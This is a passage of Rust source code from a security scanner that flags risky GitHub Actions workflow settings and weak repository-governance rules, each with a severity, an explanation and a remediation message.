                "Avoid checking out or using untrusted pull-request head content in a `pull_request_target` workflow. Split privileged operations into a safer workflow design if needed.",
                "head-reference",
            )
        } else {
            (
                Severity::Medium,
                Confidence::Medium,
                "The candidate workflow uses `pull_request_target`, which runs in the base-repository context and needs careful privilege separation.",
                "Review whether `pull_request_target` is necessary. If the workflow does not need privileged base-repo context, prefer `pull_request` instead.",
                "trigger",
            )
        };

        findings.push(
            Finding::new(
                "config.github-actions.pull-request-target",
                scanner,
                severity,
                confidence,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "GitHub Actions pull_request_target workflow detected",
                detail,
                remediation,
                format!(
                    "config-github-actions-pull-request-target:{}:{}",
                    file.display(),
                    fingerprint_suffix
                ),
            )
            .with_line(find_line_number(contents, "pull_request_target").unwrap_or(1)),
        );
    }

    if let Some(line_number) = workflow_run_line {
        findings.push(
            Finding::new(
                "config.github-actions.workflow-run",
                scanner,
                Severity::Medium,
                Confidence::High,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "GitHub Actions workflow_run trigger detected",
                "The candidate workflow uses `workflow_run`, which creates a trust boundary between an earlier workflow and a later privileged workflow. Artifact provenance and branch filtering need careful review.",
                "Review whether the follow-on workflow can consume untrusted artifacts or metadata from the upstream workflow. Keep privileged follow-on jobs narrowly scoped and explicitly pinned.",
                format!("config-github-actions-workflow-run:{}", file.display()),
            )
            .with_line(line_number),
        );
    }

    if checkout_line.is_some()
        && dispatch_ref_line.is_some()
        && (has_workflow_dispatch || has_repository_dispatch)
    {
        findings.push(
            Finding::new(
                "config.github-actions.dispatch-ref-checkout",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "Dispatch-triggered workflow checks out a caller-controlled ref",
                "The candidate workflow is triggered through a dispatch path and appears to feed caller-controlled input or payload data into checkout or execution context selection.",
                "Restrict dispatch-driven ref selection to an allowlisted set of trusted refs or remove the caller-controlled checkout path from the privileged workflow.",
                format!("config-github-actions-dispatch-ref-checkout:{}", file.display()),
            )
            .with_line(dispatch_ref_line.unwrap_or(1)),
        );
    }

    if checkout_line.is_some() && release_ref_line.is_some() && has_release_trigger {
        findings.push(
            Finding::new(
                "config.github-actions.release-target-checkout",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "Release workflow checks out release target ref dynamically",
                "The candidate release-triggered workflow appears to use `github.event.release.target_commitish` to decide what code to build or publish. That path deserves careful provenance review before a publish step uses it.",
                "Prefer release automation that builds from a verified immutable tag or commit SHA instead of a mutable target-commitish reference.",
                format!("config-github-actions-release-target-ref:{}", file.display()),
            )
            .with_line(release_ref_line.unwrap_or(1)),
        );
    }

    if let Some(line_number) = publish_line {
        if has_attestation_step && (!has_id_token_write || !has_attestations_write) {
            let missing_permissions = match (has_id_token_write, has_attestations_write) {
                (false, false) => "`id-token: write` and `attestations: write`",
                (false, true) => "`id-token: write`",
                (true, false) => "`attestations: write`",
                (true, true) => unreachable!(),
            };

            findings.push(
                Finding::new(
                    "config.github-actions.attestation-permissions",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "GitHub Actions attestation step lacks required token permissions",
                    format!(
                        "The candidate workflow includes an artifact-attestation step, but the workflow permissions do not visibly grant {}. That weakens or breaks the intended provenance path for published artifacts.",
                        missing_permissions
                    ),
                    "Grant the minimum required attestation permissions explicitly, including `id-token: write` and `attestations: write`, before relying on the workflow for release provenance.",
                    format!("config-github-actions-attestation-permissions:{}", file.display()),
                )
                .with_line(attestation_line.unwrap_or(line_number)),
            );
        }

        if let Some(trusted_line) = trusted_publishing_line {
            if !has_id_token_write {
                findings.push(
                    Finding::new(
                        "config.github-actions.trusted-publishing-permissions",
                        scanner,
                        Severity::High,
                        Confidence::High,
                        FindingCategory::Configuration,
                        Some(file.to_path_buf()),
                        "GitHub Actions trusted publishing flow lacks id-token permission",
                        "The candidate workflow appears to use an OIDC-backed trusted publishing path such as `npm publish --provenance` or `pypa/gh-action-pypi-publish`, but the workflow permissions do not visibly grant `id-token: write`. That weakens or breaks the intended short-lived publish identity flow.",
                        "Grant `id-token: write` explicitly before relying on trusted publishing for package release provenance.",
                        format!(
                            "config-github-actions-trusted-publishing-permissions:{}",
                            file.display()
                        ),
                    )
                    .with_line(trusted_line),
                );
            }
        }

        if has_push_trigger && !has_tag_filter {
            findings.push(
                Finding::new(
                    "config.github-actions.branch-push-publish",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "GitHub Actions workflow publishes artifacts from a mutable branch push",
                    "The candidate workflow appears to publish or release artifacts from a branch-based `push` trigger rather than a tag or release event. That weakens release provenance and makes mutable branch state part of the publish authority path.",
                    "Prefer release automation that publishes only from immutable tags, verified release events, or other explicit release-control paths.",
                    format!("config-github-actions-branch-push-publish:{}", file.display()),
                )
                .with_line(line_number),
            );
        }

        if (has_tag_filter || has_release_trigger) && mutable_release_branch_ref_line.is_some() {
            findings.push(
                Finding::new(
                    "config.github-actions.release-branch-ref",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "Tag or release workflow checks out a mutable branch ref",
                    "The candidate tag- or release-triggered workflow appears to override checkout to a mutable branch ref such as `main` or the default branch. That breaks the expectation that published artifacts come from the immutable tag or release object that triggered the workflow.",
                    "Build and publish from the immutable tag or release SHA that triggered the workflow instead of overriding checkout to a mutable branch ref.",
                    format!("config-github-actions-release-branch-ref:{}", file.display()),
                )
                .with_line(mutable_release_branch_ref_line.unwrap_or(line_number)),
            );
        }

        if !has_provenance_signal {
            findings.push(
                Finding::new(
                    "config.github-actions.publish-without-provenance",
                    scanner,
                    Severity::Medium,
                    Confidence::Medium,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "GitHub Actions publish workflow lacks explicit provenance or signing signals",
                    "The candidate workflow appears to publish artifacts, but it does not show an obvious provenance or signing signal such as OIDC-backed attestation or an explicit signing step.",
                    "Prefer release workflows that emit provenance or signatures explicitly, for example through OIDC-backed attestations or a documented signing step.",
                    format!("config-github-actions-publish-without-provenance:{}", file.display()),
                )
                .with_line(line_number),
            );
        }

        if let Some(credential_line) = long_lived_publish_credential_line {
            findings.push(
                Finding::new(
                    "config.github-actions.publish-long-lived-credential",
                    scanner,
                    Severity::Medium,
                    Confidence::High,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "GitHub Actions publish workflow relies on long-lived registry credentials",
                    "The candidate workflow appears to publish artifacts with a static registry credential sourced from GitHub Actions secrets. Long-lived publish tokens weaken release authority compared with trusted publishing or other short-lived identity-backed issuance.",
                    "Prefer trusted publishing or another short-lived credential flow for package publication instead of static registry secrets stored in repository or organization settings.",
                    format!("config-github-actions-publish-long-lived-credential:{}", file.display()),
                )
                .with_line(credential_line),
            );
        }

        if release_publication_line.is_some() && long_lived_release_credential_line.is_some() {
            findings.push(
                Finding::new(
                    "config.github-actions.release-long-lived-credential",
                    scanner,
                    Severity::Medium,
                    Confidence::High,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "GitHub Actions release workflow relies on long-lived release credentials",
                    "The candidate workflow appears to create or publish a GitHub release while loading a static PAT-style credential from GitHub Actions secrets. Long-lived release credentials broaden compromise impact compared with ephemeral repository tokens or short-lived identity-backed release flows.",
                    "Prefer the ephemeral repository token or another narrowly scoped short-lived credential flow for GitHub release publication instead of long-lived PAT-style secrets.",
                    format!("config-github-actions-release-long-lived-credential:{}", file.display()),
                )
                .with_line(long_lived_release_credential_line.unwrap_or(release_publication_line.unwrap_or(line_number))),
            );
        }
    }

    if let Some(signing_line) = keyless_signing_line {
        if !has_id_token_write {
            findings.push(
                Finding::new(
                    "config.github-actions.keyless-signing-permissions",
                    scanner,
                    Severity::High,
                    Confidence::High,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "GitHub Actions keyless signing flow lacks id-token permission",
                    "The candidate workflow appears to use an OIDC-backed keyless signing path such as `cosign sign --keyless` or `cosign attest --keyless`, but the workflow permissions do not visibly grant `id-token: write`. That weakens or breaks the intended short-lived signing identity flow.",
                    "Grant `id-token: write` explicitly before relying on keyless signing or attestation in the release workflow.",
                    format!(
                        "config-github-actions-keyless-signing-permissions:{}",
                        file.display()
                    ),
                )
                .with_line(signing_line),
            );
        }
    }

    if signing_activity_line.is_some() && long_lived_signing_credential_line.is_some() {
        findings.push(
            Finding::new(
                "config.github-actions.signing-long-lived-credential",
                scanner,
                Severity::Medium,
                Confidence::High,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "GitHub Actions signing workflow relies on long-lived signing credentials",
                "The candidate workflow appears to perform artifact or release signing while loading a static signing key or passphrase from GitHub Actions secrets. Long-lived signing material broadens compromise impact compared with keyless or otherwise short-lived signing flows.",
                "Prefer keyless or short-lived signing flows where possible, and avoid keeping long-lived signing private keys in repository or organization secrets.",
                format!(
                    "config-github-actions-signing-long-lived-credential:{}",
                    file.display()
                ),
            )
            .with_line(long_lived_signing_credential_line.unwrap_or(signing_activity_line.unwrap_or(1))),
        );
    }

    if let (Some(build_line), Some(push_line)) = (docker_build_push_line, docker_push_line) {
        if docker_login_line.is_some() && long_lived_publish_credential_line.is_some() {
            findings.push(
                Finding::new(
                    "config.github-actions.oci-long-lived-registry-credential",
                    scanner,
                    Severity::Medium,
                    Confidence::High,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "GitHub Actions OCI publish workflow relies on long-lived registry credentials",
                    "The candidate workflow appears to authenticate to a container registry with a static credential sourced from GitHub Actions secrets and then push images through `docker/build-push-action`. Long-lived registry credentials broaden compromise impact compared with short-lived identity-backed registry issuance.",
                    "Prefer short-lived registry authentication or trusted registry issuance flows instead of static registry passwords or tokens stored in repository or organization secrets.",
                    format!(
                        "config-github-actions-oci-long-lived-registry-credential:{}",
                        file.display()
                    ),
                )
                .with_line(long_lived_publish_credential_line.unwrap_or(docker_login_line.unwrap_or(push_line.max(build_line)))),
            );
        }

        if !has_oci_provenance_signal
            && !lower.contains("cosign sign")
            && !lower.contains("cosign attest")
            && !lower.contains("sigstore")
        {
            findings.push(
                Finding::new(
                    "config.github-actions.oci-publish-without-provenance",
                    scanner,
                    Severity::Medium,
                    Confidence::High,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "GitHub Actions OCI publish workflow lacks explicit provenance or signing signals",
                    "The candidate workflow appears to publish container images through `docker/build-push-action` with `push: true`, but it does not show an explicit OCI provenance or signing signal such as Buildx provenance, Cosign, or Sigstore-backed attestation.",
                    "Enable OCI provenance or signing explicitly for published images, for example through Buildx provenance settings, Cosign signing, or another documented registry attestation path.",
                    format!("config-github-actions-oci-publish-without-provenance:{}", file.display()),
                )
                .with_line(push_line.max(build_line)),
            );
        }
    }

    if has_push_trigger && tag_creation_line.is_some() && tag_push_line.is_some() {
        findings.push(
            Finding::new(
                "config.github-actions.branch-push-tags",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "GitHub Actions branch workflow creates and pushes Git tags",
                "The candidate branch-triggered workflow appears to mint and push Git tags as part of automation. That lets mutable branch state manufacture release refs inside the workflow itself, which weakens release authority and provenance review.",
                "Keep tag creation and release publication behind explicit release control paths. Avoid having ordinary branch workflows create and push release tags automatically.",
                format!("config-github-actions-branch-push-tags:{}", file.display()),
            )
            .with_line(tag_creation_line.unwrap_or(tag_push_line.unwrap_or(1))),
        );
    }

    if has_pull_request_target
        && checkout_line.is_some()
        && head_reference_line.is_none()
        && !persist_credentials_disabled
    {
        findings.push(
            Finding::new(
                "config.github-actions.pull-request-target.checkout-credentials",
                scanner,
                Severity::High,
                Confidence::Medium,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "pull_request_target workflow checks out code without disabling persisted credentials",
                "The candidate `pull_request_target` workflow uses `actions/checkout` but does not explicitly disable persisted Git credentials. That can leave a privileged token available to later workflow steps.",
                "If checkout is required in a privileged workflow, set `persist-credentials: false` and keep untrusted pull-request content away from privileged steps.",
                format!(
                    "config-github-actions-pr-target-checkout-credentials:{}",
                    file.display()
                ),
            )
            .with_line(checkout_line.unwrap_or(1)),
        );
    }

    if let Some(line_number) = self_hosted_line {
        let (severity, confidence, detail, fingerprint_suffix) = if has_pull_request_target {
            (
                Severity::High,
                Confidence::High,
                "The candidate workflow combines `pull_request_target` with a self-hosted runner, which increases the risk of privileged code execution on trusted infrastructure.",
                "pr-target",
            )
        } else if has_pull_request {
            (
                Severity::High,
                Confidence::Medium,
                "The candidate workflow runs on a self-hosted runner for pull-request-triggered execution. Untrusted pull-request code on self-hosted infrastructure needs careful isolation.",
                "pull-request",
            )
        } else {
            (
                Severity::Medium,
                Confidence::Medium,
                "The candidate workflow uses a self-hosted runner, which expands the trusted infrastructure boundary and deserves review in security-sensitive repositories.",
                "general",
            )
        };

        findings.push(
            Finding::new(
                "config.github-actions.self-hosted-runner",
                scanner,
                severity,
                confidence,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "GitHub Actions workflow uses a self-hosted runner",
                detail,
                "Review runner isolation, network reachability, and whether untrusted pull-request code can reach the runner. Prefer GitHub-hosted runners for less-trusted workflows.",
                format!(
                    "config-github-actions-self-hosted:{}:{}",
                    file.display(),
                    fingerprint_suffix
                ),
            )
            .with_line(line_number),
        );
    }

    if let Some(line_number) = secrets_inherit_line {
        findings.push(
            Finding::new(
                "config.github-actions.secrets-inherit",
                scanner,
                Severity::Medium,
                Confidence::High,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "GitHub Actions workflow inherits all caller secrets",
                "The candidate workflow uses `secrets: inherit`, which broadens secret exposure to the reusable workflow boundary.",
                "Pass only the specific secrets that are required instead of inheriting the full caller secret set.",
                format!("config-github-actions-secrets-inherit:{}", file.display()),
            )
            .with_line(line_number),
        );
    }

    if let Some(line_number) = unsecure_commands_line {
        findings.push(
            Finding::new(
                "config.github-actions.unsecure-commands",
                scanner,
                Severity::High,
                Confidence::High,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "GitHub Actions workflow enables unsecure commands",
                "The candidate workflow enables `ACTIONS_ALLOW_UNSECURE_COMMANDS`, which weakens command-channel hardening in GitHub Actions.",
                "Remove the unsecure-commands setting and migrate to supported workflow command patterns.",
                format!("config-github-actions-unsecure-commands:{}", file.display()),
            )
            .with_line(line_number),
        );
    }

    if let Some(line_number) = download_artifact_line {
        if let Some(execution_line) = artifact_execution_line {
            findings.push(
                Finding::new(
                    "config.github-actions.artifact-execution",
                    scanner,
                    if has_untrusted_pr_trigger || workflow_run_line.is_some() {
                        Severity::High
                    } else {
                        Severity::Medium
                    },
                    Confidence::High,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "GitHub Actions workflow downloads artifacts and appears to execute them",
                    "The candidate workflow downloads artifacts and later appears to execute or mark downloaded content executable. That can turn artifact provenance mistakes into code-execution risk.",
                    "Review artifact trust boundaries carefully. Prefer rebuilding from reviewed source or verifying artifact provenance before executing downloaded payloads.",
                    format!("config-github-actions-artifact-execution:{}", file.display()),
                )
                .with_line(execution_line.max(line_number)),
            );
        }
    }

    for (line_number, action, reference) in github_action_uses_entries(contents) {
        if action.starts_with("./") {
            continue;
        }

        if action.starts_with("docker://") {
            findings.push(
                Finding::new(
                    "config.github-actions.docker-action",
                    scanner,
                    Severity::Medium,
                    Confidence::High,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "GitHub Actions workflow uses a direct Docker action image",
                    "The candidate workflow references a `docker://` action image directly. That shifts review and provenance trust to the remote container image path.",
                    "Prefer reviewed actions with auditable pinned revisions or pin the container image by immutable digest with explicit justification.",
                    format!(
                        "config-github-actions-docker-action:{}:{}",
                        file.display(),
                        action
                    ),
                )
                .with_line(line_number),
            );
            continue;
        }

        if action.contains("/.github/workflows/") {
            if reference.contains("${{") || is_pinned_action_reference(&reference) {
                continue;
            }

            findings.push(
                Finding::new(
                    "config.github-actions.unpinned-reusable-workflow",
                    scanner,
                    if has_release_trigger || has_workflow_dispatch || workflow_run_line.is_some() {
                        Severity::High
                    } else {
                        Severity::Medium
                    },
                    Confidence::High,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "GitHub Actions workflow uses a mutable reusable workflow reference",
                    format!(
                        "The candidate workflow uses the reusable workflow `{action}@{reference}` instead of pinning it to an immutable commit SHA."
                    ),
                    "Pin reusable workflows to a full commit SHA so release and deployment behavior changes only through explicit review.",
                    format!(
                        "config-github-actions-unpinned-reusable-workflow:{}:{}:{}",
                        file.display(),
                        action,
                        reference
                    ),
                )
                .with_line(line_number),
            );
            continue;
        }

        if action.matches('/').count() != 1
            || is_first_party_github_action(&action)
            || reference.contains("${{")
            || is_pinned_action_reference(&reference)
        {
            continue;
        }

        findings.push(
            Finding::new(
                "config.github-actions.unpinned-third-party-action",
                scanner,
                if has_untrusted_pr_trigger {
                    Severity::High
                } else {
                    Severity::Medium
                },
                Confidence::High,
                FindingCategory::Configuration,
                Some(file.to_path_buf()),
                "GitHub Actions workflow uses a mutable third-party action reference",
                format!(
                    "The candidate workflow uses `{action}@{reference}` instead of pinning the third-party action to an immutable commit SHA."
                ),
                "Pin third-party actions to a full commit SHA and update them intentionally through reviewable dependency maintenance.",
                format!(
                    "config-github-actions-unpinned-action:{}:{}:{}",
                    file.display(),
                    action,
                    reference
                ),
            )
            .with_line(line_number),
        );
    }

    findings
}

fn is_github_repo_governance_file(file: &Path) -> bool {
    let path_text = file.to_string_lossy().replace('\\', "/");
    path_text.contains(".github/rulesets/")
        || matches!(
            path_text.as_str(),
            ".github/settings.yml"
                | ".github/settings.yaml"
                | ".github/repository.yml"
                | ".github/repository.yaml"
        )
}

fn scan_github_repo_governance_config(
    scanner: &'static str,
    file: &Path,
    contents: &str,
) -> Vec<Finding> {
    let mut findings = Vec::new();
    let lower = contents.to_ascii_lowercase();
    let path_text = file.to_string_lossy().replace('\\', "/");
    let is_ruleset = path_text.contains(".github/rulesets/");

    for (id, title, detail, remediation, severity, confidence, line_number, fingerprint_suffix) in [
        (
            "config.github-governance.force-push",
            "GitHub repository governance allows force pushes",
            "The candidate repository-governance config appears to allow force pushes on a protected branch surface. Force pushes weaken review history and make release provenance harder to trust.",
            "Disable force pushes for protected branches and release refs unless there is a narrowly scoped operational exception.",
            Severity::High,
            Confidence::High,
            find_first_line(contents, &["allow_force_pushes: true", "\"allow_force_pushes\": true", "allows_force_pushes: true", "\"allows_force_pushes\": true"]),
            "force-push",
        ),
        (
            "config.github-governance.deletions",
            "GitHub repository governance allows branch or tag deletions",
            "The candidate repository-governance config appears to allow deletions on a protected branch or tag surface. That weakens release retention and reviewability guarantees.",
            "Disable deletions for protected branches and release refs unless the repository has a deliberate retention exception.",
            Severity::High,
            Confidence::High,
            find_first_line(contents, &["allow_deletions: true", "\"allow_deletions\": true", "allows_deletions: true", "\"allows_deletions\": true"]),
            "deletions",
        ),
        (
            "config.github-governance.admin-enforcement-disabled",
            "GitHub repository governance does not enforce rules for administrators",
            "The candidate governance config appears to disable administrator enforcement. That creates a bypass path around review and branch protection expectations.",
            "Enable administrator enforcement for protected branches so high-privilege actors still follow the intended release and review path.",
            Severity::High,
            Confidence::Medium,
            find_first_line(contents, &["enforce_admins: false", "\"enforce_admins\": false"]),
            "admins",
        ),
        (
            "config.github-governance.zero-approval-review",
            "GitHub repository governance requires zero approving reviews",
            "The candidate governance config explicitly sets the required approving review count to zero. That weakens protected-branch review posture even when pull requests remain nominally required.",
            "Require at least one approving review for protected branches, and more for high-risk repositories.",
            Severity::High,
            Confidence::High,
            find_first_line(contents, &["required_approving_review_count: 0", "\"required_approving_review_count\": 0"]),
            "zero-approvals",
        ),
        (
            "config.github-governance.codeowner-review-disabled",
            "GitHub repository governance disables required code-owner review",
            "The candidate governance config explicitly disables required code-owner review. That weakens ownership-based review on sensitive paths even if CODEOWNERS exists.",
            "Require code-owner review on protected branches that rely on CODEOWNERS for security-sensitive ownership.",
            Severity::Medium,
            Confidence::High,
            find_first_line(contents, &["require_code_owner_reviews: false", "\"require_code_owner_reviews\": false", "require_code_owner_review: false", "\"require_code_owner_review\": false"]),
            "codeowner-review",
        ),
        (
            "config.github-governance.stale-reviews-kept",
            "GitHub repository governance keeps stale approvals after new commits",
            "The candidate governance config explicitly keeps previous approvals after new commits. That can allow substantial code changes to land without refreshed review.",
            "Enable stale-review dismissal so approvals are re-earned after substantive branch updates.",
            Severity::Medium,
            Confidence::High,
            find_first_line(contents, &["dismiss_stale_reviews: false", "\"dismiss_stale_reviews\": false"]),
            "stale-reviews",
        ),
        (
            "config.github-governance.signed-commits-disabled",
            "GitHub repository governance disables required signed commits",
            "The candidate governance config explicitly disables required signed commits on a protected branch surface. That weakens provenance and identity guarantees for changes landing on governed refs.",
            "Require signed commits on protected branches unless the repository has a deliberate and reviewed exception.",
            Severity::Medium,
            Confidence::High,
            find_first_line(contents, &["required_signatures: false", "\"required_signatures\": false"]),
            "signed-commits",
        ),
        (
            "config.github-governance.linear-history-disabled",
            "GitHub repository governance disables required linear history",
            "The candidate governance config explicitly disables required linear history on a protected branch surface. That weakens auditability and provenance review by allowing merge shapes that preserve less deterministic history.",
            "Require linear history on protected branches unless the repository has a deliberate and reviewed exception.",
            Severity::Medium,
            Confidence::High,
            find_first_line(contents, &["required_linear_history: false", "\"required_linear_history\": false"]),
            "linear-history",
        ),
        (
            "config.github-governance.conversation-resolution-disabled",
            "GitHub repository governance disables required conversation resolution",
            "The candidate governance config explicitly disables required conversation resolution on a protected branch surface. That weakens review closure expectations by allowing unresolved review threads to remain open while changes land.",
            "Require conversation resolution on protected branches unless the repository has a deliberate and reviewed exception.",
            Severity::Medium,
            Confidence::High,
            find_first_line(contents, &["required_conversation_resolution: false", "\"required_conversation_resolution\": false"]),
            "conversation-resolution",
        ),
        (
            "config.github-governance.status-checks-disabled",
            "GitHub repository governance disables required status checks",
            "The candidate governance config explicitly disables required status checks on a protected branch surface. That weakens merge gating by allowing changes to land without declared CI or policy checks succeeding first.",
            "Require status checks on protected branches unless the repository has a deliberate and reviewed exception.",
            Severity::High,
            Confidence::High,
            find_first_line(
                contents,
                &[
                    "required_status_checks: null",
                    "\"required_status_checks\": null",
                    "required_status_checks: {}",
                    "\"required_status_checks\": {}",
                ],
            ),
            "status-checks",
        ),
    ] {
        if let Some(line_number) = line_number {
            findings.push(
                Finding::new(
                    id,
                    scanner,
                    severity,
                    confidence,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    title,
                    detail,
                    remediation,
                    format!("config-github-governance-{fingerprint_suffix}:{}", file.display()),
                )
                .with_line(line_number),
            );
        }
    }

    if is_ruleset {
        if let Some(line_number) = find_first_line(
            contents,
            &[
                "enforcement: evaluate",
                "\"enforcement\": \"evaluate\"",
                "enforcement: disabled",
                "\"enforcement\": \"disabled\"",
            ],
        ) {
            findings.push(
                Finding::new(
                    "config.github-governance.ruleset-not-active",
                    scanner,
                    Severity::Medium,
                    Confidence::High,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "GitHub ruleset is not enforced in active mode",
                    "The candidate GitHub ruleset appears to use `evaluate` or `disabled` enforcement instead of active enforcement. That weakens the repository's governance path from hard blocking to observation or inactivity.",
                    "Use active enforcement for rulesets that are intended to protect release and branch integrity.",
                    format!("config-github-governance-ruleset-enforcement:{}", file.display()),
                )
                .with_line(line_number),
            );
        }

        if let Some(line_number) = find_first_line(
            contents,
            &[
                "bypass_actors:",
                "\"bypass_actors\"",
                "bypass_pull_request_allowances:",
                "\"bypass_pull_request_allowances\"",
            ],
        ) {
            findings.push(
                Finding::new(
                    "config.github-governance.ruleset-bypass",
                    scanner,
                    Severity::Medium,
                    Confidence::Medium,
                    FindingCategory::Configuration,
                    Some(file.to_path_buf()),
                    "GitHub ruleset declares explicit bypass actors or allowances",
                    "The candidate GitHub ruleset includes explicit bypass actors or pull-request bypass allowances. That may be necessary operationally, but it creates a governance exception path that deserves review.",
                    "Keep bypass actors narrowly scoped, documented, and auditable. Prefer the smallest exception surface that still supports release operations.",
                    format!("config-github-governance-ruleset-bypass:{}", file.display()),
                )
                .with_line(line_number),
            );
        }

        if lower.contains("non_fast_forward") || lower.contains("non-fast-forward") {
            let line_number = find_first_line(
                contents,
                &[
                    "non_fast_forward",
                    "\"non_fast_forward\"",
                    "non-fast-forward",
                    "\"non-fast-forward\"",
                ],
            );
            let explicitly_disabled = lower.contains("\"enabled\": false")
                || lower.contains("enabled: false")
                || lower.contains("\"mode\": \"disabled\"")
                || lower.contains("mode: disabled");
            if explicitly_disabled {
                findings.push(
                    Finding::new(
                        "config.github-governance.ruleset-non-fast-forward-disabled",
                        scanner,
                        Severity::High,
                        Confidence::Medium,
                        FindingCategory::Configuration,
                        Some(file.to_path_buf()),
                        "GitHub ruleset appears to disable non-fast-forward protection",
                        "The candidate ruleset references non-fast-forward protection but appears to disable it. That can reopen force-push style history rewriting on a governed ref surface.",
                        "Enable non-fast-forward protection for protected branches and tags unless the repository has a tightly controlled exception.",
                        format!(
                            "config-github-governance-ruleset-non-fast-forward:{}",
                            file.display()
                        ),
                    )
                    .with_line(line_number.unwrap_or(1)),
                );
            }
        }

        if lower.contains("required_signatures") || lower.contains("required-signatures") {
            let line_number = find_first_line(
                contents,
                &[
                    "required_signatures",
                    "\"required_signatures\"",
                    "required-signatures",
                    "\"required-signatures\"",
                ],
            );
            let explicitly_disabled = lower.contains("\"enabled\": false")
                || lower.contains("enabled: false")
                || lower.contains("\"mode\": \"disabled\"")
                || lower.contains("mode: disabled");
            if explicitly_disabled {
                findings.push(
                    Finding::new(
                        "config.github-governance.ruleset-signed-commits-disabled",
                        scanner,
                        Severity::Medium,
                        Confidence::High,
                        FindingCategory::Configuration,
                        Some(file.to_path_buf()),
                        "GitHub ruleset appears to disable required signed commits",
                        "The candidate ruleset references required signed commits but appears to disable that protection. That weakens commit identity and provenance guarantees on a governed ref surface.",
                        "Enable required signed commits for protected branches and tags unless the repository has a tightly controlled exception.",
                        format!(
                            "config-github-governance-ruleset-signed-commits:{}",
                            file.display()
                        ),
                    )
                    .with_line(line_number.unwrap_or(1)),
                );
            }
        }

        if lower.contains("required_linear_history") || lower.contains("required-linear-history")
        {
            let line_number = find_first_line(
                contents,
                &[
                    "required_linear_history",
                    "\"required_linear_history\"",
                    "required-linear-history",
                    "\"required-linear-history\"",
                ],
            );
            let explicitly_disabled = lower.contains("\"enabled\": false")
                || lower.contains("enabled: false")
                || lower.contains("\"mode\": \"disabled\"")
                || lower.contains("mode: disabled");
            if explicitly_disabled {
                findings.push(
                    Finding::new(
                        "config.github-governance.ruleset-linear-history-disabled",
                        scanner,
                        Severity::Medium,
                        Confidence::High,
                        FindingCategory::Configuration,
                        Some(file.to_path_buf()),
                        "GitHub ruleset appears to disable required linear history",
                        "The candidate ruleset references required linear history but appears to disable that protection. That weakens reviewable branch history and provenance expectations on a governed ref surface.",
                        "Enable required linear history for protected branches and tags unless the repository has a tightly controlled exception.",
                        format!(
                            "config-github-governance-ruleset-linear-history:{}",
                            file.display()
                        ),
                    )
                    .with_line(line_number.unwrap_or(1)),
                );
            }
        }

        if lower.contains("required_conversation_resolution")
            || lower.contains("required-conversation-resolution")
        {
            let line_number = find_first_line(
                contents,
                &[
                    "required_conversation_resolution",
                    "\"required_conversation_resolution\"",
                    "required-conversation-resolution",
                    "\"required-conversation-resolution\"",
                ],
            );
            let explicitly_disabled = lower.contains("\"enabled\": false")
                || lower.contains("enabled: false")
                || lower.contains("\"mode\": \"disabled\"")
                || lower.contains("mode: disabled");
            if explicitly_disabled {
                findings.push(
                    Finding::new(
                        "config.github-governance.ruleset-conversation-resolution-disabled",
                        scanner,
                        Severity::Medium,
                        Confidence::High,
                        FindingCategory::Configuration,
                        Some(file.to_path_buf()),
                        "GitHub ruleset appears to disable required conversation resolution",
                        "The candidate ruleset references required conversation resolution but appears to disable that protection. That weakens review completion expectations on a governed ref surface.",
                        "Enable required conversation resolution for protected branches and tags unless the repository has a tightly controlled exception.",
                        format!(
                            "config-github-governance-ruleset-conversation-resolution:{}",
                            file.display()
                        ),
                    )
                    .with_line(line_number.unwrap_or(1)),
                );
            }
        }

        if lower.contains("required_status_checks") || lower.contains("required-status-checks") {
            let line_number = find_first_line(
                contents,
                &[
                    "required_status_checks",
                    "\"required_status_checks\"",
                    "required-status-checks",
                    "\"required-status-checks\"",
                ],
            );
            let explicitly_disabled = lower.contains("\"enabled\": false")
                || lower.contains("enabled: false")
                || lower.contains("\"mode\": \"disabled\"")
                || lower.contains("mode: disabled");
            if explicitly_disabled {
                findings.push(
                    Finding::new(
                        "config.github-governance.ruleset-status-checks-disabled",
                        scanner,
                        Severity::High,
                        Confidence::High,
                        FindingCategory::Configuration,
                        Some(file.to_path_buf()),
                        "GitHub ruleset appears to disable required status checks",
                        "The candidate ruleset references required status checks but appears to disable that protection. That weakens merge gating and release trust by allowing governed refs to advance without declared check success.",
                        "Enable required status checks for protected branches and tags unless the repository has a tightly controlled exception.",
                        format!(
                            "config-github-governance-ruleset-status-checks:{}",
                            file.display()
                        ),
                    )
                    .with_line(line_number.unwrap_or(1)),
                );
            }
        }
    }

    findings
}

fn scan_dockerfile(scanner: &'static str, file: &Path, contents: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut stage_names = HashSet::new();
    let mut final_stage_user = None;

    for (index, line) in contents.lines().enumerate() {
        let line_number = index + 1;
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }

